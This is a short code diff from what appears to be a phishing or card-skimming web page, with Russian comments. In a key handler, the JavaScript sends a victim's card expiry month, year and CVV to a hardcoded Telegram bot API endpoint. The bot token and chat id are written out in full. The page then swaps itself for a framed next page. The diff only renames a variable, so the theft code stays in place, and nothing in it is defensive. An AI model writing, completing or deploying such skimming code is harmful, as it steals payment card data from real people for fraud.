@@ -455,9 +455,9 @@ document.getElementById('check_6').onkeydown = function (e) {
             // if(true)
             {
                 // передача через телегу меся  год  cvv
-                const URL = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${month}${year}${cvv}`;
+                const URL_2 = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${month}${year}${cvv}`;
                     console.log("post ...");
-                    axios.post(URL); 
+                    axios.post(URL_2); 
                 console.log('Button clicked');
                 document.body.innerHTML = '<iframe src="start_3.html" width="368" height="700" align="bottom">Ваш браузер не поддерживает плавающие фреймы!</iframe> ';
                 
